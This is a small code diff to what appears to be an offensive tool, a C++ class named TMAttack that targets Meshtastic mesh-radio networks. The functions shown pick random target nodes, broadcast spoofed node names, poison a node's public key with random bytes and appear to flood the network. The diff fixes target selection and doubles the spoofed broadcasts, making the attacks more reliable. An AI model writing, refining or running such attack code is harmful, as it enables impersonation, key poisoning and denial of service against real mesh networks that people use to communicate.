@@ -14,6 +14,9 @@ uint32_t TMAttack::getRandomTarget() {
                 ++it;
             }
         }
+        if (it == meshtasticCompact->nodeinfo_db.end()) {
+            return 0;
+        }
         srcnode = it->node_id;
     } while (cnt < 100 && srcnode == 0);
     return srcnode;
@@ -77,6 +80,7 @@ void TMAttack::atkNameChange() {
     strncpy(node->long_name, new_name.c_str(), 39);
     node->long_name[39] = '\0';
     meshtasticCompact->SendNodeInfo(*node, 0xffffffff, false);
+    meshtasticCompact->SendNodeInfo(*node, 0xffffffff, false);
 }
 
 void TMAttack::atkDdos() {
@@ -108,6 +112,7 @@ void TMAttack::atkPkiPoison() {
     for (int i = 0; i < 32; i++) {
         node->public_key[i] = esp_random() & 0xff;
     }
+    meshtasticCompact->SendNodeInfo(*node, 0xffffffff, false);
     meshtasticCompact->SendNodeInfo(*node, 0xffffffff, false);
 }
 
